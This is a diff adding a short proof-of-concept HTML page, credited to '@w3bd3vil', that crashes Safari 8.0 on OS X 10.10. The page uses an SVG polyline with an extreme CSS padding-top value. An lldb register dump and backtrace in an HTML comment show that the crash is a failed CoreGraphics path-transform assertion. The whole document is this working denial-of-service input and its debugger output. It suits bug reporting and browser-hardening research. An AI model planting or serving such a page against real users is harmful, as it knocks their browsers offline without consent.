@@ -1,0 +1,127 @@
+@w3bd3vil
+
+<!DOCTYPE html>
+<head>
+    <style>
+        svg {
+            padding-top: 1337%;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+    <svg viewBox="0 0 500 500" width="500" height="500">
+        <polyline points="1 1,2 2"></polyline>
+    </svg>
+</body>
+</html>
+
+<!--
+	Safari 8.0 / OSX 10.10
+	
+* thread #1: tid = 0xc2e73, 0x00007fff8ab10282 libsystem_kernel.dylib`__pthread_kill + 10, queue = 'com.apple.main-thread', stop reason = signal SIGABRT
+    frame #0: 0x00007fff8ab10282 libsystem_kernel.dylib`__pthread_kill + 10
+libsystem_kernel.dylib`__pthread_kill + 10:
+-> 0x7fff8ab10282:  jae    0x7fff8ab1028c            ; __pthread_kill + 20
+   0x7fff8ab10284:  movq   %rax, %rdi
+   0x7fff8ab10287:  jmp    0x7fff8ab0bca3            ; cerror_nocancel
+   0x7fff8ab1028c:  retq   
+(lldb) register read 
+General Purpose Registers:
+       rax = 0x0000000000000000
+       rbx = 0x0000000000000006
+       rcx = 0x00007fff5b761d98
+       rdx = 0x0000000000000000
+       rdi = 0x000000000000140f
+       rsi = 0x0000000000000006
+       rbp = 0x00007fff5b761dc0
+       rsp = 0x00007fff5b761d98
+        r8 = 0x0000000000000000
+        r9 = 0x00000000000000a8
+       r10 = 0x0000000008000000
+       r11 = 0x0000000000000206
+       r12 = 0x00007fff84b36487  "transform_is_valid(m)"
+       r13 = 0x0000000108c2c000
+       r14 = 0x00007fff747ae300  libsystem_pthread.dylib`_thread
+       r15 = 0x00007fff84b36477  "Paths/CGPath.cc"
+       rip = 0x00007fff8ab10282  libsystem_kernel.dylib`__pthread_kill + 10
+    rflags = 0x0000000000000206
+        cs = 0x0000000000000007
+        fs = 0x0000000000000000
+        gs = 0x0000000000000000
+
+(lldb) bt 
+* thread #1: tid = 0xc2e73, 0x00007fff8ab10282 libsystem_kernel.dylib`__pthread_kill + 10, queue = 'com.apple.main-thread', stop reason = signal SIGABRT
+  * frame #0: 0x00007fff8ab10282 libsystem_kernel.dylib`__pthread_kill + 10
+    frame #1: 0x00007fff904df4c3 libsystem_pthread.dylib`pthread_kill + 90
+    frame #2: 0x00007fff88d36b73 libsystem_c.dylib`abort + 129
+    frame #3: 0x00007fff88cfec59 libsystem_c.dylib`__assert_rtn + 321
+    frame #4: 0x00007fff84643cb6 CoreGraphics`CGPathCreateMutableCopyByTransformingPath + 242
+    frame #5: 0x00007fff84692a2f CoreGraphics`CGContextAddPath + 93
+    frame #6: 0x00007fff8e9b5f04 WebCore`WebCore::GraphicsContext::fillPath(WebCore::Path const&) + 148
+    frame #7: 0x00007fff8f479ad1 WebCore`WebCore::RenderSVGResourceSolidColor::postApplyResource(WebCore::RenderElement&, WebCore::GraphicsContext*&, unsigned short, WebCore::Path const*, WebCore::RenderSVGShape const*) + 65
+    frame #8: 0x00007fff8f47a2fa WebCore`WebCore::RenderSVGShape::fillShape(WebCore::RenderStyle const&, WebCore::GraphicsContext*) + 122
+    frame #9: 0x00007fff8f47a633 WebCore`WebCore::RenderSVGShape::fillStrokeMarkers(WebCore::PaintInfo&) + 131
+    frame #10: 0x00007fff8eab4aeb WebCore`WebCore::RenderSVGShape::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 379
+    frame #11: 0x00007fff8eab477d WebCore`WebCore::RenderSVGRoot::paintReplaced(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 1325
+    frame #12: 0x00007fff8ea2c3f2 WebCore`WebCore::RenderReplaced::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 722
+    frame #13: 0x00007fff8ef300a8 WebCore`WebCore::InlineElementBox::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::LayoutUnit, WebCore::LayoutUnit) + 312
+    frame #14: 0x00007fff8e9b1e83 WebCore`WebCore::InlineFlowBox::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::LayoutUnit, WebCore::LayoutUnit) + 1251
+    frame #15: 0x00007fff8e9b1929 WebCore`WebCore::RootInlineBox::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::LayoutUnit, WebCore::LayoutUnit) + 89
+    frame #16: 0x00007fff8e9613c6 WebCore`WebCore::RenderLineBoxList::paint(WebCore::RenderBoxModelObject*, WebCore::PaintInfo&, WebCore::LayoutPoint const&) const + 694
+    frame #17: 0x00007fff8e95e9a3 WebCore`WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 67
+    frame #18: 0x00007fff8e95dd54 WebCore`WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 420
+    frame #19: 0x00007fff8e95ffdf WebCore`WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 287
+    frame #20: 0x00007fff8f3d74c9 WebCore`WebCore::RenderBlock::paintChild(WebCore::RenderBox&, WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::PaintInfo&, bool) + 393
+    frame #21: 0x00007fff8e95eaa8 WebCore`WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::PaintInfo&, bool) + 72
+    frame #22: 0x00007fff8e95ea50 WebCore`WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 240
+    frame #23: 0x00007fff8e95dd54 WebCore`WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 420
+    frame #24: 0x00007fff8e95ffdf WebCore`WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 287
+    frame #25: 0x00007fff8f3d74c9 WebCore`WebCore::RenderBlock::paintChild(WebCore::RenderBox&, WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::PaintInfo&, bool) + 393
+    frame #26: 0x00007fff8e95eaa8 WebCore`WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::PaintInfo&, bool) + 72
+    frame #27: 0x00007fff8e95ea50 WebCore`WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 240
+    frame #28: 0x00007fff8e95dd54 WebCore`WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 420
+    frame #29: 0x00007fff8e95ffdf WebCore`WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 287
+    frame #30: 0x00007fff8f3d74c9 WebCore`WebCore::RenderBlock::paintChild(WebCore::RenderBox&, WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::PaintInfo&, bool) + 393
+    frame #31: 0x00007fff8e95eaa8 WebCore`WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::PaintInfo&, bool) + 72
+    frame #32: 0x00007fff8e95ea50 WebCore`WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 240
+    frame #33: 0x00007fff8e95dd54 WebCore`WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 420
+    frame #34: 0x00007fff8e95ffdf WebCore`WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::LayoutPoint const&) + 287
+    frame #35: 0x00007fff8e95e8e2 WebCore`WebCore::RenderLayer::paintForegroundForFragmentsWithPhase(WebCore::PaintPhase, WTF::Vector<WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow> const&, WebCore::GraphicsContext*, WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int, WebCore::RenderObject*) + 370
+    frame #36: 0x00007fff8e95e5b7 WebCore`WebCore::RenderLayer::paintForegroundForFragments(WTF::Vector<WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow> const&, WebCore::GraphicsContext*, WebCore::GraphicsContext*, WebCore::LayoutRect const&, bool, WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int, WebCore::RenderObject*, bool, bool) + 423
+    frame #37: 0x00007fff8e95d252 WebCore`WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext*, WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int) + 2386
+    frame #38: 0x00007fff8e95c6e2 WebCore`WebCore::RenderLayer::paintLayer(WebCore::GraphicsContext*, WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int) + 1010
+    frame #39: 0x00007fff8e95d392 WebCore`WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext*, WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int) + 2706
+    frame #40: 0x00007fff8e988376 WebCore`WebCore::RenderLayerBacking::paintIntoLayer(WebCore::GraphicsLayer const*, WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned int, unsigned int) + 358
+    frame #41: 0x00007fff8f432baf WebCore`WebCore::RenderLayerBacking::paintContents(WebCore::GraphicsLayer const*, WebCore::GraphicsContext&, unsigned int, WebCore::FloatRect const&) + 799
+    frame #42: 0x00007fff8ee86924 WebCore`WebCore::GraphicsLayer::paintGraphicsLayerContents(WebCore::GraphicsContext&, WebCore::FloatRect const&) + 132
+    frame #43: 0x00007fff8f3b2f59 WebCore`WebCore::PlatformCALayer::drawLayerContents(CGContext*, WebCore::PlatformCALayer*, WTF::Vector<WebCore::FloatRect, 5ul, WTF::CrashOnOverflow>&) + 361
+    frame #44: 0x00007fff8f60f367 WebCore`WebCore::TileGrid::platformCALayerPaintContents(WebCore::PlatformCALayer*, WebCore::GraphicsContext&, WebCore::FloatRect const&) + 167
+    frame #45: 0x00007fff8f6983fc WebCore`-[WebSimpleLayer drawInContext:] + 172
+    frame #46: 0x00007fff85249355 QuartzCore`CABackingStoreUpdate_ + 3820
+    frame #47: 0x00007fff85248463 QuartzCore`___ZN2CA5Layer8display_Ev_block_invoke + 59
+    frame #48: 0x00007fff8524841f QuartzCore`x_blame_allocations + 81
+    frame #49: 0x00007fff85247f1c QuartzCore`CA::Layer::display_() + 1546
+    frame #50: 0x00007fff8f69831b WebCore`-[WebSimpleLayer display] + 43
+    frame #51: 0x00007fff85247641 QuartzCore`CA::Layer::display_if_needed(CA::Transaction*) + 603
+    frame #52: 0x00007fff85246d7d QuartzCore`CA::Layer::layout_and_display_if_needed(CA::Transaction*) + 35
+    frame #53: 0x00007fff8524650e QuartzCore`CA::Context::commit_transaction(CA::Transaction*) + 242
+    frame #54: 0x00007fff85246164 QuartzCore`CA::Transaction::commit() + 390
+    frame #55: 0x00007fff85256f55 QuartzCore`CA::Transaction::observer_callback(__CFRunLoopObserver*, unsigned long, void*) + 71
+    frame #56: 0x00007fff867e5d87 CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ + 23
+    frame #57: 0x00007fff867e5ce0 CoreFoundation`__CFRunLoopDoObservers + 368
+    frame #58: 0x00007fff867d7858 CoreFoundation`CFRunLoopRunSpecific + 328
+    frame #59: 0x00007fff8434943f HIToolbox`RunCurrentEventLoopInMode + 235
+    frame #60: 0x00007fff843491ba HIToolbox`ReceiveNextEventCommon + 431
+    frame #61: 0x00007fff84348ffb HIToolbox`_BlockUntilNextEventMatchingListInModeWithFilter + 71
+    frame #62: 0x00007fff90583821 AppKit`_DPSNextEvent + 964
+    frame #63: 0x00007fff90582fd0 AppKit`-[NSApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 194
+    frame #64: 0x00007fff90576f73 AppKit`-[NSApplication run] + 594
+    frame #65: 0x00007fff90562424 AppKit`NSApplicationMain + 1832
+    frame #66: 0x00007fff8d881ef2 libxpc.dylib`_xpc_objc_main + 793
+    frame #67: 0x00007fff8d883a9d libxpc.dylib`xpc_main + 490
+    frame #68: 0x000000010449ab40 com.apple.WebKit.WebContent`___lldb_unnamed_function1$$com.apple.WebKit.WebContent + 16
+    frame #69: 0x00007fff850755c9 libdyld.dylib`start + 1
+    frame #70: 0x00007fff850755c9 libdyld.dylib`start + 1
+(lldb) 
+-->
